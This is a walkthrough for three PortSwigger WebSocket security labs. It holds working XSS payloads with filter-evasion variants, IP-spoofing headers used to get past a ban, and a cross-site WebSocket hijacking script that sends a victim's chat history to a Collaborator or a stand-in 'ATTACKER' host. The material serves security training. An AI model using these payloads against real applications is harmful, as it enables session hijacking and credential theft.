# WebSockets Security - Quick Start Guide

**Complete all 3 PortSwigger labs in 60-90 minutes**

---

## Prerequisites

**Required Tools:**
- Burp Suite (Community or Professional)
- Web browser configured with Burp proxy
- PortSwigger Academy account (free)

**Lab Access:** https://portswigger.net/web-security/websockets

---

## Lab 1: Manipulating WebSocket Messages (15-20 minutes)

### Quick Overview
- **Difficulty:** Apprentice
- **Goal:** Trigger `alert()` in support agent's browser
- **Technique:** Intercept and modify WebSocket messages

### Rapid Solution

**Step 1: Setup (2 minutes)**
```
1. Start Burp Suite
2. Configure browser proxy: 127.0.0.1:8080
3. Enable WebSocket interception:
   Proxy → Options → WebSocket Interception Rules → Check enabled
```

**Step 2: Access Chat (1 minute)**
```
1. Open lab
2. Click "Live chat"
3. Send message: "Hello"
```

**Step 3: Observe Traffic (2 minutes)**
```
1. Burp → Proxy → WebSockets history
2. Locate your message
3. Note format: {"message":"Hello"}
```

**Step 4: Intercept & Inject (5 minutes)**
```
1. In chat, type: "Test"
2. Message intercepted in Proxy → Intercept
3. Change to: {"message":"<img src=1 onerror='alert(1)'>"}
4. Click "Forward"
5. Lab solved! ✓
```

### Key Payload
```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

### Alternative Payloads
```json
{"message":"<svg onload=alert(1)>"}
{"message":"<img src=x onerror=alert(document.domain)>"}
{"message":"<script>alert(1)</script>"}
```

### Common Issues
- **Not intercepting?** Check Proxy → Options → WebSocket Interception Rules
- **Alert not showing?** Ensure you modified the WebSocket frame, not the input field
- **Invalid JSON?** Verify the message structure is correct

---

## Lab 2: Manipulating WebSocket Handshake (20-30 minutes)

### Quick Overview
- **Difficulty:** Practitioner
- **Goal:** Bypass XSS filter and IP ban
- **Technique:** Spoof IP + obfuscate payload

### Rapid Solution

**Step 1: Initial Test (5 minutes)**
```
1. Open lab → Click "Live chat"
2. Send message: "test"
3. Burp → Proxy → WebSockets history → Right-click → Send to Repeater
```

**Step 2: Trigger IP Ban (3 minutes)**
```
In Repeater:
1. Change message: {"message":"<script>alert(1)</script>"}
2. Click "Send"
3. Observe: Connection terminated, IP banned
```

**Step 3: Bypass IP Ban (5 minutes)**
```
In Repeater:
1. Click pencil icon (handshake editor)
2. Add header: X-Forwarded-For: 1.1.1.1
3. Click "Connect"
4. New WebSocket established! ✓
```

**Step 4: Bypass XSS Filter (7 minutes)**
```
Test payloads in Repeater:
1. {"message":"<img src=1 onerror=alert(1)>"}      → Blocked
2. {"message":"<img src=1 ONERROR=alert(1)>"}      → Blocked
3. {"message":"<img src=1 oNeRrOr=alert(1)>"}      → Blocked
4. {"message":"<img src=1 oNeRrOr=alert`1`>"}      → SUCCESS! ✓
```

### Key Techniques

**IP Spoofing:**
```http
X-Forwarded-For: 1.1.1.1
```

**XSS Obfuscation:**
```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

**Why it works:**
- Case variation: `oNeRrOr` instead of `onerror`
- Backticks: `` alert`1` `` instead of `alert(1)`

### Alternative IP Headers
```http
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
X-Client-IP: 1.1.1.1
```

### Alternative XSS Bypasses
```json
{"message":"<svg OnLoAd=alert(1)>"}
{"message":"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>"}
{"message":"<body OnLoAd=alert(1)>"}
```

### Common Issues
- **Can't find handshake editor?** Look for pencil icon next to WebSocket URL in Repeater
- **Still banned?** Must click "Connect" to establish NEW connection with spoofed IP
- **Filter still blocks?** Try more obfuscation: mix case, use backticks, try different tags

---

## Lab 3: Cross-Site WebSocket Hijacking (25-35 minutes)

### Quick Overview
- **Difficulty:** Practitioner
- **Goal:** Steal victim's credentials via CSWSH
- **Technique:** Host malicious JavaScript to hijack WebSocket

### Rapid Solution

**Step 1: Analyze WebSocket (5 minutes)**
```
1. Open lab → Click "Live chat"
2. Send messages: "Hello", "Test"
3. Refresh page
4. In chat, type: READY
5. Observe: Previous messages are loaded

In Burp:
6. Proxy → WebSockets history → Locate "READY" command
7. Observe: Server returns chat history
8. Proxy → HTTP history → Find WebSocket handshake (Upgrade: websocket)
9. Notice: Only session cookie, NO CSRF token! ← Vulnerable
```

**Step 2: Extract WebSocket URL (2 minutes)**
```
From handshake request:
Host: 0a1e005f03c5a9f1802f41b700d10047.web-security-academy.net
Path: /chat

WebSocket URL: wss://YOUR-LAB-ID.web-security-academy.net/chat
```

**Step 3: Setup Burp Collaborator (3 minutes)**
```
1. Burp → Burp menu → Burp Collaborator client
2. Click "Copy to clipboard"
3. Save your URL: abc123xyz.oastify.com
```

**Step 4: Create Exploit (5 minutes)**
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

**Step 5: Host Exploit (3 minutes)**
```
1. Click "Go to exploit server" (in lab)
2. Paste exploit in "Body" field
3. Replace YOUR-LAB-ID with actual lab ID
4. Replace YOUR-COLLABORATOR with your Collaborator URL
5. Click "Store"
```

**Step 6: Test (Optional - 2 minutes)**
```
1. Click "View exploit"
2. Check browser console for "[+] WebSocket connected"
3. Burp Collaborator → Click "Poll now"
4. Verify data is being received
```

**Step 7: Deliver Exploit (3 minutes)**
```
1. Click "Deliver exploit to victim"
2. Wait 10-15 seconds
3. Burp Collaborator → Click "Poll now"
4. Review received data
```

**Step 8: Extract Credentials (3 minutes)**
```
In Collaborator results:
1. Look through POST requests
2. Find message containing credentials
   Example: {"user":"carlos","content":"My password is password123"}
3. Extract: carlos / password123
```

**Step 9: Login & Solve (2 minutes)**
```
1. Go to lab login page
2. Enter: carlos / password123
3. Click "Log in"
4. Lab solved! ✓
```

### Complete Exploit Template
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    ws.onopen = function() {
        console.log('[+] Connected');
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        console.log('[+] Received:', event.data);
        fetch('https://YOUR-COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

### Alternative Exfiltration (Using Exploit Server Logs)
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        // Exfiltrate via GET request to exploit server
        fetch('https://YOUR-EXPLOIT-SERVER.exploit-server.net/log?data=' + btoa(event.data), {
            method: 'GET',
            mode: 'no-cors'
        });
    };
</script>
```

Then check "Access log" in exploit server to view exfiltrated data.

### Common Issues
- **WebSocket fails to connect?** Check protocol (wss:// not ws://), verify URL includes /chat
- **No data in Collaborator?** Click "Poll now", wait 30 seconds, check exploit syntax
- **Credentials not found?** Look through ALL messages carefully, victim may mention password
- **Can't login?** Verify username (usually "carlos"), check password has no extra spaces

---

## Quick Reference: Burp Suite WebSocket Features

### WebSocket Interception
```
Location: Proxy → Options → WebSocket Interception Rules
Enable: Check "Intercept WebSocket messages"
Filters: URL contains, message contains, direction
```

### WebSocket History
```
Location: Proxy → WebSockets history
Features:
  - View all WebSocket connections
  - Search messages
  - Filter by direction (→ outbound, ← inbound)
  - Right-click → Send to Repeater
```

### Repeater
```
Features:
  - Test WebSocket messages
  - Modify and resend
  - Edit handshake (click pencil icon)
  - Connection management (Connect/Disconnect)
```

### Handshake Modification
```
In Repeater:
1. Click pencil icon next to WebSocket URL
2. Add/modify headers
3. Click "Connect" to establish new connection
```

### Collaborator
```
Location: Burp menu → Burp Collaborator client
Usage:
1. Click "Copy to clipboard" for URL
2. Use in exploits for data exfiltration
3. Click "Poll now" to retrieve data
```

---

## Essential Payloads Cheat Sheet

### XSS Payloads
```html
<img src=1 onerror='alert(1)'>
<svg onload=alert(1)>
<script>alert(1)</script>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

### XSS Obfuscation
```html
<img src=1 oNeRrOr=alert(1)>          <!-- Case variation -->
<img src=1 onerror=alert`1`>           <!-- Backticks -->
<img src=1 onerror=alert(String.fromCharCode(88,83,83))>  <!-- Encoding -->
<svg OnLoAd=alert(1)>                  <!-- Case variation -->
```

### IP Spoofing Headers
```http
X-Forwarded-For: 1.1.1.1
X-Real-IP: 192.168.1.1
X-Originating-IP: 10.0.0.1
X-Client-IP: 8.8.8.8
True-Client-IP: 1.1.1.1
```

### CSWSH Template
```html
<script>
var ws = new WebSocket('wss://TARGET/PATH');
ws.onopen = () => ws.send("COMMAND");
ws.onmessage = (e) => fetch('https://ATTACKER', {method:'POST', body:e.data});
</script>
```

---

## Testing Methodology

### 1. Reconnaissance (5 minutes)
```
□ Identify WebSocket endpoints
□ Observe WebSocket traffic in Burp
□ Analyze message structure
□ Check handshake for CSRF tokens
□ Note authentication mechanism
```

### 2. Message Manipulation (10 minutes)
```
□ Test XSS payloads
□ Test SQL injection
□ Test command injection
□ Test path traversal
□ Test input validation bypasses
```

### 3. Handshake Exploitation (10 minutes)
```
□ Test IP spoofing headers
□ Test origin bypass
□ Test authentication bypass
□ Test custom headers
□ Test protocol manipulation
```

### 4. CSWSH Testing (15 minutes)
```
□ Check for CSRF tokens in handshake
□ Test origin validation
□ Create CSWSH PoC
□ Test data exfiltration
□ Attempt privilege escalation
```

---

## Common Vulnerabilities Checklist

### High Priority
```
□ Missing CSRF token in handshake (CSWSH)
□ No input validation (XSS, SQLi)
□ Trust in X-Forwarded-For header
□ Missing origin validation
□ No authentication on WebSocket endpoint
```

### Medium Priority
```
□ Unencrypted ws:// connections
□ No rate limiting
□ Missing authorization checks
□ Verbose error messages
□ Lack of message size limits
```

### Low Priority (Defense in Depth)
```
□ No connection timeouts
□ Missing security headers
□ Inadequate logging
□ No anomaly detection
□ Client-side validation only
```

---

## Time-Saving Tips

### Lab 1 (Message Manipulation)
- **Fastest method:** Enable interception, send message, modify, forward - takes 30 seconds once configured
- **Skip:** Testing multiple payloads; first basic payload works
- **Remember:** Modify WebSocket frame in Burp, not in browser input

### Lab 2 (Handshake Manipulation)
- **Fastest method:** Send to Repeater immediately, avoid re-testing in browser
- **Critical:** Must edit handshake THEN reconnect for IP spoof to work
- **Try first:** `oNeRrOr` with backticks - most reliable bypass

### Lab 3 (CSWSH)
- **Fastest method:** Use Collaborator, not exploit server logs (cleaner interface)
- **Critical:** Replace BOTH lab ID and Collaborator URL in exploit
- **Time saver:** Test exploit yourself first (View exploit button)
- **Look for:** Password usually in format "My password is [password]"

---

## Troubleshooting Guide

### Issue: WebSocket messages not appearing in Burp
**Solution:**
- Ensure Proxy is running
- Check browser is configured correctly (127.0.0.1:8080)
- Look in Proxy → WebSockets history (separate from HTTP history)
- Verify WebSocket connection was established (look for handshake in HTTP history)

### Issue: Interception not working
**Solution:**
- Proxy → Options → WebSocket Interception Rules → Enable
- Check that "Intercept is on" button is enabled
- Verify rule matches your WebSocket URL
- Try "Intercept all WebSocket messages"

### Issue: Can't edit WebSocket handshake in Repeater
**Solution:**
- Look for pencil/edit icon next to WebSocket URL
- In older Burp versions: Right-click → Edit handshake
- Ensure you're in WebSocket Repeater tab, not HTTP Repeater

### Issue: IP ban persists after spoofing
**Solution:**
- You must click "Connect" to establish NEW connection
- Simply adding header doesn't reconnect automatically
- Verify header was actually added to handshake
- Try different IP address (1.1.1.1, 8.8.8.8, 127.0.0.1)

### Issue: XSS filter still blocks obfuscated payload
**Solution:**
- Try multiple obfuscation techniques together
- Use backticks: `` alert`1` ``
- Mix case: oNeRrOr, OnLoAd, OnErRoR
- Try different tags: img, svg, body, iframe
- Use alternative syntax: alert(String.fromCharCode(88,83,83))

### Issue: CSWSH exploit doesn't receive data
**Solution:**
- Click "Poll now" in Burp Collaborator
- Wait 30-60 seconds before polling
- Check browser console for errors (test exploit yourself)
- Verify WebSocket URL is correct (include /chat path)
- Ensure mode: 'no-cors' is set in fetch
- Check that READY command triggers history retrieval

### Issue: Can't find credentials in exfiltrated data
**Solution:**
- Look through ALL messages, not just first one
- Search for keywords: password, credential, login, pass
- Check format: may be in content field of JSON
- Victim may mention password in natural language: "My password is..."
- Try delivering exploit again for fresh data

---

## Practice Scenarios

### Scenario 1: Real-World Chat Application
```
Target: Live chat on e-commerce site
Goal: Test for XSS and CSWSH
Steps:
1. Open chat, send message
2. Observe in Burp WebSockets history
3. Test XSS: <img src=x onerror=alert(1)>
4. Check handshake for CSRF tokens
5. If none, test CSWSH exploit
```

### Scenario 2: Real-Time Notifications
```
Target: Dashboard with WebSocket notifications
Goal: Test authorization and data access
Steps:
1. Login as low-privilege user
2. Observe WebSocket in Burp
3. Note notification format
4. Test accessing other users' notifications
5. Modify userId parameter
6. Test wildcard: userId: "*"
```

### Scenario 3: Collaborative Tool
```
Target: Real-time document editing
Goal: Test for privilege escalation
Steps:
1. Join document as viewer
2. Observe WebSocket commands
3. Test: {action: "edit", content: "test"}
4. Test: {action: "admin", operation: "delete"}
5. Test role parameter: {role: "admin"}
```

---

## Next Steps

### After Completing Labs
1. **Review solutions** - Understand why vulnerabilities exist
2. **Try variations** - Test different payloads and techniques
3. **Read writeups** - Learn alternative approaches
4. **Practice tools** - Master Burp Suite WebSocket features

### Additional Learning
1. **PortSwigger Learning Path** - Complete related topics (XSS, CSRF)
2. **Bug Bounty Programs** - Test on platforms like HackerOne, Bugcrowd
3. **CTF Challenges** - WebSocket-focused challenges
4. **Real-World Testing** - Test on applications you own/have permission

### Recommended Resources
- **PortSwigger Blog** - Latest WebSocket research
- **OWASP WebSocket Security** - Best practices guide
- **Bug bounty writeups** - Real-world CSWSH exploits
- **CVE Database** - Study WebSocket vulnerabilities

---

## Quick Command Reference

### wscat (CLI Testing)
```bash
# Connect
wscat -c wss://target.com/chat

# With headers
wscat -c wss://target.com/chat -H "Cookie: session=abc"

# Send message on connect
wscat -c wss://target.com/chat -x "READY"
```

### Python Testing
```python
import asyncio
import websockets

async def test():
    uri = "wss://target.com/chat"
    async with websockets.connect(uri) as ws:
        await ws.send('{"message":"test"}')
        response = await ws.recv()
        print(response)

asyncio.run(test())
```

### JavaScript (Browser Console)
```javascript
var ws = new WebSocket('wss://target.com/chat');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.send(JSON.stringify({message: "test"}));
```

---

## Success Metrics

### Lab Completion Times
- **Lab 1:** 15-20 minutes (target: 10 minutes with practice)
- **Lab 2:** 20-30 minutes (target: 15 minutes with practice)
- **Lab 3:** 25-35 minutes (target: 20 minutes with practice)
- **Total:** 60-85 minutes (target: 45 minutes expert level)

### Skill Indicators
- ✓ Can identify WebSocket traffic in Burp
- ✓ Can intercept and modify messages
- ✓ Can manipulate handshake headers
- ✓ Can create CSWSH exploits
- ✓ Can use Burp Collaborator for exfiltration
- ✓ Understand WebSocket security implications

---

**Document Version:** 1.0
**Last Updated:** January 2026
**Estimated Time:** Complete all 3 labs in 60-90 minutes
**Difficulty Progression:** Apprentice → Practitioner → Real-World Application
